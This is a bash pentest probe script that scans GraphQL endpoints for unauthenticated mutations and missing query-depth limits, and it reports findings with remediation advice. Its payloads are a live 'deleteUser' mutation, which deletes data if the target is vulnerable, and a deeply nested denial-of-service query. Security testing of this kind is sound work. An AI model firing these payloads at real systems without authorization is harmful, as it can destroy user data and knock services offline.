#!/usr/bin/env bash
# ============================================================================
# SentinelAI Autonomous Pentest Platform — Security PoC Probe
# Name:        GraphQL Mutation & Depth Abuse
# Description: Tests for mutations without auth and deep query DoS
# Severity:    HIGH
# Category:    Broken Access Control & Authentication
# Language:    bash
# ============================================================================

# Target argument handling: allow positional arg $1 or env var TARGET
TARGET="${1:-${TARGET:-}}"
SCAN_ID="${SCAN_ID:-standalone_poc_test}"
DEPTH="${DEPTH:-standard}"

if [ -z "$TARGET" ]; then
  echo -e "\033[1;31m[-] Error: Missing TARGET argument.\033[0m"
  echo -e "\033[1;33m[*] Usage:   $0 <target_url_or_ip>\033[0m"
  echo -e "\033[1;34m[*] Example: $0 https://example.com\033[0m"
  exit 1
fi

# Normalize URL: remove trailing slash
TARGET="${TARGET%/}"

echo -e "\033[1;36m[*] [SentinelAI PoC] Running probe: GraphQL Mutation & Depth Abuse\033[0m"
echo -e "\033[1;34m[*] Target: $TARGET\033[0m"
echo ""

# Standard emit handler for standalone terminal execution
emit() {
  echo -e "\033[1;32m[+] VULNERABILITY CONFIRMED / FINDING EMITTED:\033[0m"
  echo "$1" | python3 -m json.tool 2>/dev/null || echo "    $1"
}

# --- Core PoC Execution ---
emit() { printf '%s\n' "$1"; }
T="$TARGET"
for G in "graphql" "api/graphql" "api/v1/graphql"; do
  # test mutation without auth
  RESP=$(curl -s -X POST -H "Content-Type: application/json" -d '{"query":"mutation { deleteUser(id: 1) { id } }"}' --max-time 10 "$T/$G" 2>/dev/null | head -c 500)
  if echo "$RESP" | grep -q "id" && ! echo "$RESP" | grep -qi "error\|unauthorized\|auth"; then
    emit "{\"title\":\"GraphQL mutation without authentication: /$G\",\"severity\":\"critical\",\"description\":\"deleteUser mutation executes without auth at /$G. Data destruction possible.\",\"remediation\":\"Require authentication on all mutations. Implement field-level authorization.\",\"cweId\":\"CWE-306\",\"owaspCategory\":\"A01:2025-Broken Access Control\"}"
  fi
  # depth test — deeply nested query
  DEEP="{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}"
  S=$(date +%s%N)
  curl -s -o /dev/null -X POST -H "Content-Type: application/json" -d "{\"query\":\"query $DEEP\"}" --max-time 20 "$T/$G" 2>/dev/null
  E=$(date +%s%N)
  D=$(( (E - S) / 1000000 ))
  if [ $D -gt 3000 ]; then
    emit "{\"title\":\"GraphQL depth attack — no query depth limit: /$G\",\"severity\":\"medium\",\"description\":\"50-level nested query took ${D}ms. No depth limiting — DoS via resource exhaustion possible.\",\"remediation\":\"Implement query depth limiting (max 10 levels) and cost analysis.\",\"cweId\":\"CWE-400\",\"owaspCategory\":\"A04:2025-Insecure Design\"}"
  fi
done

echo ""
echo -e "\033[1;34m[*] Probe execution complete.\033[0m"
